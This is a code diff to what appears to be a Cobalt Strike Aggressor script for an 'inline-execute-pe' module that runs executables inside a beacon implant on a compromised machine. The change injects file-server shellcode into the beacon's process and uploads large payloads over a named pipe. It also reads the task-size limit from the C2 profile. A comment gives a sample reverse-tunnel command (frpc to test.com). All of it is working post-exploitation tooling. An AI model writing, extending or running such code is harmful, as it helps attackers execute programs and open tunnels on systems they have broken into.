@@ -242,7 +242,7 @@ sub parse_args {
 #   $5 - $exepath - The path to the exe on the attacker machine.
 #   $6 - $cmdline - Raw command-line. e.g. (frpc.exe stcp -s test.com -P 1234 -t 1234 -n "my name" -l 1234)
 sub inline_execute_pe {
-    local('$bid $features $force $stdinpath $exepath $cmdline $exe $stdin $jobver $barch $bof $args');
+    local('$bid $features $force $stdinpath $exepath $cmdline $exe $stdin $jobver $tasksize $pid $fspath $fspipe $barch $bof $args');
     ($bid, $features, $force, $stdinpath, $exepath, $cmdline) = @_;
 
     # Get the beacon architecture to select the corresponding BOF
@@ -270,6 +270,29 @@ sub inline_execute_pe {
     }
 
     trace('inline-execute-pe arguments: ' . 'features: 0x' . formatNumber($features, 16) . ', force: ' . $force . ', exe: ' . $exepath . ' (' . format_size(strlen($exe)) . '), cmdline: ' . $cmdline . ' (' . strlen($cmdline) . '), jobver: ' . $jobver. ', stdin: ' . $stdinpath . ' (' . format_size(strlen($stdin)) . ')');
+
+    # Determine whether to use file server based on maximum task size
+    $tasksize = get_tasks_max_size();
+    if ((strlen($exe) + strlen($stdin) + 0x10000) > $tasksize) {
+        # Use file server if the total size of the PE file and stdin file is greater than the maximum task size (reserved 64KB for other data)
+        trace('[inline_execute_pe] The total size of the PE file and stdin file is greater than the maximum task size. Use file server.');
+
+        # Inject file server shellcode
+        $pid = int(binfo($bid, 'pid'));
+        $fspath = script_resource('fileserver.' . $barch . $debug_bof_suffix . '.bin');
+        bshinject($bid, $pid, $barch, $fspath);
+        trace('[inline_execute_pe] Injecting file server shellcode.');
+
+        # Sleep 50 ms to wait for the file server to start
+        bpause($bid, 50);
+        
+        # Upload PE file to file server
+        $fspipe = '\\\\.\\pipe\\' . $pid . '4155';
+        $exe = pack('i', 0x44332211) . pack('i', strlen($exe)) . $exe;
+        bupload_raw($bid, $fspipe, $exe, $exepath);
+        trace('[inline_execute_pe] Uploading PE file to file server by pipe: ' . $fspipe);
+        $exe = $null;
+    }
 
     # Execute BOF
     trace('[inline_execute_pe] Begin execute BOF.');
@@ -333,6 +356,17 @@ sub compare_version {
     }
 
     return 0;
+}
+
+# Get the .tasks_max_size field from the C2 profile.
+sub get_tasks_max_size {
+    local('$value');
+
+    $value = int([data_query("metadata")["c2profile"] getString: ".tasks_max_size"]);
+    if (!$value) {
+        $value = 0x100000; # 1MB
+    }
+    return $value;
 }
 
 # Skip the next argument
